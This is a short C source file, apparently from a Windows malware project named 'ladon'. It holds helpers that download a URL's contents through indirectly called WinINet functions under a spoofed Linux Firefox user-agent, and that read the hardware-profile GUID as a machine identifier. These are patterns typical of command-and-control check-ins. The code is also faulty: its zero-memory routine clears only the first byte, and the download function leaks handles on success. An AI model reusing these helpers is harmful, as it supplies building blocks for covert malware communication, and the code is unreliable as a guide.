#pragma warning(disable:4996)
#include "ladon.h"

HW_PROFILE_INFO hwProfileInfo;

LPSTR getServerResponse(LPSTR url) {
	HINTERNET hInternet = NULL;
	HINTERNET hUrl = NULL;
	DWORD dwFlags = 0;
	DWORD dwRead = 0;
	DWORD dwAllocated = 256;
	DWORD dwUsed = 0;
	CHAR buffer[256];
	LPSTR response = NULL;
	LPSTR response_temp = NULL;

	hInternet = _InternetOpen("Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0",
		INTERNET_OPEN_TYPE_PRECONFIG,
		NULL,
		NULL,
		0);

	if (hInternet == NULL) {
		return (LPSTR)"";
	}

	dwFlags = INTERNET_FLAG_RELOAD;

	if ((hUrl = _InternetOpenUrl(hInternet, url, NULL, 0, dwFlags, 0)) == NULL) {
		goto cleanup;
	}

	response = (LPSTR) _HeapAlloc(_GetProcessHeap(), 0, dwAllocated);
	if (!response) {
		goto cleanup;
	}

	*response = '\0';

	while (_InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &dwRead)) {
		if (dwRead == 0) {
			break;
		}

		while ((dwUsed + dwRead + 1) >= dwAllocated) {
			dwAllocated *= 2;
			response_temp = (LPSTR) _HeapReAlloc(_GetProcessHeap(), 0, response, dwAllocated);

			if (!response_temp) {
				goto cleanup;
			}
			else {
				response = response_temp;
			}
		}

		zstrncpy(response + dwUsed, buffer, dwRead);
		
		response[dwUsed + dwRead] = '\0';

		dwUsed += dwRead;
	}

	return response;
cleanup:
	if (hUrl != NULL)
		_InternetCloseHandle(hUrl);

	if (hInternet != NULL)
		_InternetCloseHandle(hInternet);

	if (response) {
		_HeapFree(_GetProcessHeap(), 0, response);
		response = NULL;
	}

	return response;
}

LPSTR getHwid() {
	if (_GetCurrentHwProfile(&hwProfileInfo) != 0) {
		return hwProfileInfo.szHwProfileGuid;
	}

	return (LPSTR)"";
}

 VOID LadonZeroMemory(LPVOID lpvBuffer, DWORD dwSize)
{
	for (DWORD dwIndex = 0; dwIndex < dwSize; dwIndex++)
		*((char *)lpvBuffer) = '\0';
}